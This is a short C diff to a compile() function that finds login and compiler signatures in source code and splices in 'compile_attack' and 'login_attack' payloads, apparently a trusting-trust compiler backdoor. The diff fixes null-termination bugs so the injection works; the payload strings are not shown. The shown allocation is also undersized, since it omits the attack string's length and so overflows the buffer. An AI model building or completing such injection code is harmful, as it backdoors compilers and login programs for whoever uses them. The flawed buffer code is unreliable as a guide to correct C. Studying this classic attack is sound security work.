@@ -39,6 +39,7 @@ static void compile(char *program, char *outname) {
 	if(compile_ptr = strstr(program, compile_sig)) {
 		new_prog = (char*)malloc(strlen(program) + strlen(compile_sig));
 		strncpy(new_prog, program, compile_ptr-program);
+		new_prog[compile_ptr-program] = '\0';
 		strcat(new_prog, compile_sig);
 		strcat(new_prog, compile_attack);
 		char* remaining_prog = compile_ptr + strlen(compile_sig);
@@ -51,6 +52,7 @@ static void compile(char *program, char *outname) {
 	if((login_ptr = strstr(program, login_sig))) {
 		new_prog = (char*)malloc(strlen(program) + strlen(login_sig));
 		strncpy(new_prog, program, login_ptr-program);
+		new_prog[login_ptr-program] = '\0';
 		strcat(new_prog, login_sig);
 		strcat(new_prog, login_attack);
 		char* remaining_prog = login_ptr + strlen(login_sig);
